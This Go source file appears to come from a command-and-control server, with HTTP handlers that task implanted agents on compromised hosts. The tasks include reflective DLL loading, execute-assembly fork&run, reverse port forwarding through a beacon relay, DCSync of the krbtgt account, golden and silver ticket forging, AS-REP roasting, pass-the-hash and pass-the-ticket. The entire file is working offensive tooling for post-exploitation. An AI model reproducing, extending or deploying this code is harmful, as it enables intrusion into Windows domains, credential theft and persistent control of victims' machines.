package server

import (
	"encoding/base64"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// ── P0-1: Reflective PE Loader ─────────────────────────────────────────────
func (s *Server) handlePELoader(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	file, err := c.FormFile("dll")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "DLL file required"})
		return
	}
	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("DLL too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read DLL"})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read DLL data"})
		return
	}
	b64Data := base64.StdEncoding.EncodeToString(data)

	task, err := s.createTask(id, "peloader", "", "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("PE loader requested", "agent", id, "dll", file.Filename, "size", len(data))
	s.LogAuditRecord(c, "peloader", "agent", id, fmt.Sprintf("Reflective DLL: %s (%d bytes)", file.Filename, len(data)), true, nil)
	s.dispatchTask(c, task, "peloader", file.Filename)
}

// ── P0-2: Execute-Assembly fork&run ────────────────────────────────────────
func (s *Server) handleExecuteAssemblyForkRun(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	file, err := c.FormFile("assembly")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "assembly file required"})
		return
	}
	if file.Size > MaxUploadSize {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("assembly too large: %d bytes (max %d)", file.Size, MaxUploadSize)})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly"})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read assembly data"})
		return
	}
	b64Data := base64.StdEncoding.EncodeToString(data)

	task, err := s.createTask(id, "execute_assembly_forkrun", "", "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Execute-assembly fork&run requested", "agent", id, "assembly", file.Filename, "size", len(data))
	s.LogAuditRecord(c, "execute_assembly_forkrun", "agent", id, fmt.Sprintf("Assembly fork&run: %s (%d bytes)", file.Filename, len(data)), true, nil)
	s.dispatchTask(c, task, "execute_assembly_forkrun", file.Filename)
}

// ── P0-3: Reverse Port Forward ────────────────────────────────────────────
func (s *Server) handleRPortFwdStart(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	localPort := c.PostForm("lport")
	forwardTarget := c.PostForm("target")
	if localPort == "" || forwardTarget == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "lport and target required"})
		return
	}

	cmd := localPort + "|" + forwardTarget
	task, err := s.createTask(id, "rportfwd_start", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reverse port forward started", "agent", id, "lport", localPort, "target", forwardTarget)
	s.LogAuditRecord(c, "rportfwd_start", "agent", id, fmt.Sprintf("rportfwd :%s -> %s", localPort, forwardTarget), true, nil)
	s.dispatchTask(c, task, "rportfwd_start", cmd)
}

func (s *Server) handleRPortFwdStop(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	task, err := s.createTask(id, "rportfwd_stop", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Reverse port forward stopped", "agent", id)
	s.LogAuditRecord(c, "rportfwd_stop", "agent", id, "rportfwd stop", true, nil)
	s.dispatchTask(c, task, "rportfwd_stop", "")
}

// ── P0-4: Kerberos Attacks ────────────────────────────────────────────────
func (s *Server) handleDCSync(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	user := c.PostForm("user")
	if user == "" {
		user = "krbtgt"
	}
	task, err := s.createTask(id, "dcsync", user, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("DCSync requested", "agent", id, "user", user)
	s.LogAuditRecord(c, "dcsync", "agent", id, fmt.Sprintf("DCSync user=%s", user), true, nil)
	s.dispatchTask(c, task, "dcsync", user)
}

func (s *Server) handleGoldenTicket(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	user := c.PostForm("user")
	domain := c.PostForm("domain")
	sid := c.PostForm("sid")
	krbtgtHash := c.PostForm("krbtgt_hash")
	if user == "" || domain == "" || sid == "" || krbtgtHash == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, sid, and krbtgt_hash are required"})
		return
	}
	cmd := strings.Join([]string{user, domain, sid, krbtgtHash}, "|")
	task, err := s.createTask(id, "golden_ticket", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Golden ticket requested", "agent", id, "user", user, "domain", domain)
	s.LogAuditRecord(c, "golden_ticket", "agent", id, fmt.Sprintf("Golden ticket: %s@%s /sid=%s", user, domain, sid), true, nil)
	s.dispatchTask(c, task, "golden_ticket", cmd)
}

func (s *Server) handleSilverTicket(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	user := c.PostForm("user")
	domain := c.PostForm("domain")
	sid := c.PostForm("sid")
	target := c.PostForm("target")
	rc4Hash := c.PostForm("rc4_hash")
	if user == "" || domain == "" || sid == "" || target == "" || rc4Hash == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, sid, target, and rc4_hash are required"})
		return
	}
	cmd := strings.Join([]string{user, domain, sid, target, rc4Hash}, "|")
	task, err := s.createTask(id, "silver_ticket", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Silver ticket requested", "agent", id, "user", user, "domain", domain, "target", target)
	s.LogAuditRecord(c, "silver_ticket", "agent", id, fmt.Sprintf("Silver ticket: %s@%s -> %s", user, domain, target), true, nil)
	s.dispatchTask(c, task, "silver_ticket", cmd)
}

func (s *Server) handleASREPRoast(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	task, err := s.createTask(id, "asreproast", "", "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("ASREP roast requested", "agent", id)
	s.LogAuditRecord(c, "asreproast", "agent", id, "ASREP roast requested", true, nil)
	s.dispatchTask(c, task, "asreproast", "")
}

func (s *Server) handlePassTheHash(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}
	user := c.PostForm("user")
	domain := c.PostForm("domain")
	ntlmHash := c.PostForm("ntlm_hash")
	target := c.PostForm("target")
	if user == "" || domain == "" || ntlmHash == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "user, domain, and ntlm_hash are required"})
		return
	}
	cmd := strings.Join([]string{user, domain, ntlmHash, target}, "|")
	task, err := s.createTask(id, "pass_the_hash", cmd, "", "", "", 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Pass-the-hash requested", "agent", id, "user", user, "domain", domain)
	s.LogAuditRecord(c, "pass_the_hash", "agent", id, fmt.Sprintf("PTH: %s@%s", user, domain), true, nil)
	s.dispatchTask(c, task, "pass_the_hash", cmd)
}

func (s *Server) handlePassTheTicket(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	file, err := c.FormFile("ticket")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "ticket file (.kirbi) required"})
		return
	}
	f, err := file.Open()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read ticket"})
		return
	}
	defer f.Close()
	data, err := io.ReadAll(f)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to read ticket data"})
		return
	}
	b64Data := base64.StdEncoding.EncodeToString(data)

	task, err := s.createTask(id, "pass_the_ticket", "", "", "", b64Data, 0, 0)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create task"})
		return
	}
	slog.Info("Pass-the-ticket requested", "agent", id, "file", file.Filename)
	s.LogAuditRecord(c, "pass_the_ticket", "agent", id, fmt.Sprintf("PTT: %s (%d bytes)", file.Filename, len(data)), true, nil)
	s.dispatchTask(c, task, "pass_the_ticket", file.Filename)
}

// ── P0-3: rportfwd server-side relay (binds local port, relays via beacon) ─
func (s *Server) handleRPortFwdRelayStart(c *gin.Context) {
	// Similar to SOCKS relay: server binds port, tunnels through beacon
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	localPortStr := c.PostForm("lport")
	if localPortStr == "" {
		localPortStr = "1081"
	}
	forwardTarget := c.PostForm("target")
	if forwardTarget == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "target host:port required"})
		return
	}

	lport, err := strconv.Atoi(localPortStr)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid port"})
		return
	}

	s.rportfwdMu.Lock()
	defer s.rportfwdMu.Unlock()

	if s.rportfwdListeners == nil {
		s.rportfwdListeners = make(map[string]*rportfwdRelay)
	}

	key := fmt.Sprintf("%s:%d", id, lport)
	if _, exists := s.rportfwdListeners[key]; exists {
		c.JSON(http.StatusBadRequest, gin.H{"error": "rportfwd already active for this agent:port"})
		return
	}

	relay := newRPortFwdRelay(s, id, lport, forwardTarget)
	s.rportfwdListeners[key] = relay
	go relay.start()

	slog.Info("Reverse port forward relay started", "agent", id, "lport", lport, "target", forwardTarget)
	s.LogAuditRecord(c, "rportfwd_relay_start", "agent", id, fmt.Sprintf("rportfwd relay :%d -> %s via %s", lport, forwardTarget, id), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": fmt.Sprintf("rportfwd relay :%d -> %s via %s", lport, forwardTarget, id)})
}

func (s *Server) handleRPortFwdStatus(c *gin.Context) {
	id := c.Param("id")
	if _, ok := s.getAgentOrFail(c, id); !ok {
		return
	}

	s.rportfwdMu.Lock()
	defer s.rportfwdMu.Unlock()

	for _, relay := range s.rportfwdListeners {
		if relay.agentID != id {
			continue
		}
		c.JSON(http.StatusOK, gin.H{
			"active": true,
			"port":   relay.localPort,
			"target": relay.forwardTarget,
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{"active": false})
}

func (s *Server) handleRPortFwdRelayStop(c *gin.Context) {
	id := c.Param("id")
	localPortStr := c.PostForm("lport")
	if localPortStr == "" {
		localPortStr = c.DefaultQuery("lport", "1081")
	}

	key := fmt.Sprintf("%s:%s", id, localPortStr)
	s.rportfwdMu.Lock()
	relay, exists := s.rportfwdListeners[key]
	if exists {
		delete(s.rportfwdListeners, key)
	}
	s.rportfwdMu.Unlock()

	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "no active rportfwd for this agent:port"})
		return
	}
	relay.stop()
	slog.Info("Reverse port forward relay stopped", "agent", id, "lport", localPortStr)
	s.LogAuditRecord(c, "rportfwd_relay_stop", "agent", id, fmt.Sprintf("rportfwd relay stopped :%s", localPortStr), true, nil)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "rportfwd relay stopped"})
}

// rportfwdRelay manages a local TCP listener that tunnels through a beacon channel.
type rportfwdRelay struct {
	server        *Server
	agentID       string
	localPort     int
	forwardTarget string
	listener      *rportfwdListener
	stopCh        chan struct{}
}

type rportfwdListener struct {
	ln      net.Listener
	connMap map[uint64]net.Conn
	nextID  uint64
	mu      sync.Mutex
}

func newRPortFwdRelay(s *Server, agentID string, lport int, target string) *rportfwdRelay {
	return &rportfwdRelay{
		server:        s,
		agentID:       agentID,
		localPort:     lport,
		forwardTarget: target,
		stopCh:        make(chan struct{}),
	}
}

func (r *rportfwdRelay) start() {
	addr := fmt.Sprintf("0.0.0.0:%d", r.localPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		slog.Error("rportfwd relay listen failed", "addr", addr, "err", err)
		return
	}
	r.listener = &rportfwdListener{
		ln:      ln,
		connMap: make(map[uint64]net.Conn),
	}
	go func() {
		<-r.stopCh
		ln.Close()
	}()

	slog.Info("rportfwd relay listening", "addr", addr, "target", r.forwardTarget, "agent", r.agentID)
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go r.handleConn(conn)
	}
}

func (r *rportfwdRelay) handleConn(operatorConn net.Conn) {
	defer operatorConn.Close()

	r.listener.mu.Lock()
	r.listener.nextID++
	connID := r.listener.nextID
	r.listener.connMap[connID] = operatorConn
	r.listener.mu.Unlock()

	defer func() {
		r.listener.mu.Lock()
		delete(r.listener.connMap, connID)
		r.listener.mu.Unlock()
	}()

	// Tell agent to connect to target
	r.server.sendRPortFwdFrame(r.agentID, connID, "rportfwd_connect", []byte(r.forwardTarget))

	// Relay operator->agent via beacon frames
	buf := make([]byte, 10240)
	for {
		n, err := operatorConn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			r.server.sendRPortFwdFrame(r.agentID, connID, "rportfwd_data", data)
		}
		if err != nil {
			r.server.sendRPortFwdFrame(r.agentID, connID, "rportfwd_close", nil)
			return
		}
	}
}

func (r *rportfwdRelay) stop() {
	close(r.stopCh)
}

// sendRPortFwdFrame enqueues a frame for the agent to pick up on next beacon.
func (s *Server) sendRPortFwdFrame(agentID string, connID uint64, action string, data []byte) {
	s.socksEngine.enqueueFrame(agentID, socksFrame{
		ConnID: connID,
		Action: action,
		Data:   data,
	})
}

// processRPortFwdData handles rportfwd data coming FROM the agent back to the operator.
func (s *Server) processRPortFwdData(agentID string, frame socksFrame) {
	// Find the associated listener
	s.rportfwdMu.Lock()
	defer s.rportfwdMu.Unlock()
	for key, relay := range s.rportfwdListeners {
		if strings.HasPrefix(key, agentID+":") {
			_ = relay
			// Write data to the operator's TCP connection
			if relay.listener != nil {
				relay.listener.mu.Lock()
				conn, ok := relay.listener.connMap[frame.ConnID]
				relay.listener.mu.Unlock()
				if ok {
					conn.Write(frame.Data)
				}
			}
		}
	}
}

// cleanupStaleRPortFwd removes stale rportfwd listeners on agent disconnect
func (s *Server) cleanupStaleRPortFwd() {
	s.rportfwdMu.Lock()
	defer s.rportfwdMu.Unlock()
	for key, relay := range s.rportfwdListeners {
		var agent db.Implant
		if err := s.db.First(&agent, "id = ?", relay.agentID).Error; err != nil {
			relay.stop()
			delete(s.rportfwdListeners, key)
			continue
		}
		if time.Since(agent.LastSeen) > s.offlineThreshold()*2 {
			relay.stop()
			delete(s.rportfwdListeners, key)
		}
	}
}

// Add rportfwdMu and rportfwdListeners to Server (handled via init in server.go)
